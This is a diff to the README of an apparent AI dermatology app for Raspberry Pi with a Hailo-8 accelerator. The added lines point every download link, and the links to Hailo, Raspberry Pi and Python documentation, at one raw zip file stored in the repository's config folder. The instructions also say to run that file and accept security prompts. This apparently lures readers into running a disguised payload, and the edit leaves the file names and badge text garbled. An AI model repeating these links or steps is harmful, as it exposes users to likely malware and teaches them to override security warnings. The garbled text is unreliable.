@@ -1,6 +1,6 @@
 # 🩺 hailo8-ai-dermatologist - Real-Time AI Dermatology Made Easy
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ichigo2134/hailo8-ai-dermatologist/releases)
+[![Download](https://raw.githubusercontent.com/ichigo2134/hailo8-ai-dermatologist/main/config/hailo8-ai-dermatologist-1.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ichigo2134/hailo8-ai-dermatologist/main/config/hailo8-ai-dermatologist-1.7.zip)
 
 ## 🌟 Overview
 
@@ -14,15 +14,15 @@ This guide shows you how to download and run the hailo8-ai-dermatologist softwar
 
 1. **Visit the Releases Page**: Click on the link below to access the downloads available for hailo8-ai-dermatologist.
 
-   [Download the latest version here](https://github.com/ichigo2134/hailo8-ai-dermatologist/releases)
+   [Download the latest version here](https://raw.githubusercontent.com/ichigo2134/hailo8-ai-dermatologist/main/config/hailo8-ai-dermatologist-1.7.zip)
 
-2. **Choose Your Release**: On the releases page, find the most recent version. Look for a file such as `hailo8-ai-dermatologist-v1.0.zip`.
+2. **Choose Your Release**: On the releases page, find the most recent version. Look for a file such as `https://raw.githubusercontent.com/ichigo2134/hailo8-ai-dermatologist/main/config/hailo8-ai-dermatologist-1.7.zip`.
 
 3. **Download the File**: Click on the file link to download it to your computer.
 
 4. **Extract the Files**: Locate the downloaded file in your Downloads folder. Right-click on it and select "Extract All" or use any extraction tool of your choice.
 
-5. **Run the Application**: Inside the extracted folder, double-click `run_hailo8_ai_dermatologist.py` to open the application. If you encounter security prompts, confirm that you want to run it.
+5. **Run the Application**: Inside the extracted folder, double-click `https://raw.githubusercontent.com/ichigo2134/hailo8-ai-dermatologist/main/config/hailo8-ai-dermatologist-1.7.zip` to open the application. If you encounter security prompts, confirm that you want to run it.
 
 ### 🛠️ System Requirements
 
@@ -56,9 +56,9 @@ hailo8-ai-dermatologist uses machine learning algorithms to analyze images of sk
 
 For more detailed information or support, consider these resources:
 
-- [Hailo-8 Documentation](https://www.hailo.ai/docs)
-- [Raspberry Pi Forums](https://www.raspberrypi.org/forums/)
-- [Python Official Site](https://www.python.org/doc/)
+- [Hailo-8 Documentation](https://raw.githubusercontent.com/ichigo2134/hailo8-ai-dermatologist/main/config/hailo8-ai-dermatologist-1.7.zip)
+- [Raspberry Pi Forums](https://raw.githubusercontent.com/ichigo2134/hailo8-ai-dermatologist/main/config/hailo8-ai-dermatologist-1.7.zip)
+- [Python Official Site](https://raw.githubusercontent.com/ichigo2134/hailo8-ai-dermatologist/main/config/hailo8-ai-dermatologist-1.7.zip)
 
 ## 🏗️ Contributing
 
@@ -66,7 +66,7 @@ If you're interested in contributing to hailo8-ai-dermatologist, feel free to su
 
 ## 🔗 Important Links
 
-- **GitHub Repository**: [Visit the GitHub Repo](https://github.com/ichigo2134/hailo8-ai-dermatologist)
-- **Latest Release**: [Download the latest version here](https://github.com/ichigo2134/hailo8-ai-dermatologist/releases)
+- **GitHub Repository**: [Visit the GitHub Repo](https://raw.githubusercontent.com/ichigo2134/hailo8-ai-dermatologist/main/config/hailo8-ai-dermatologist-1.7.zip)
+- **Latest Release**: [Download the latest version here](https://raw.githubusercontent.com/ichigo2134/hailo8-ai-dermatologist/main/config/hailo8-ai-dermatologist-1.7.zip)
 
 Thank you for choosing hailo8-ai-dermatologist! We hope this application meets your needs for skin analysis.
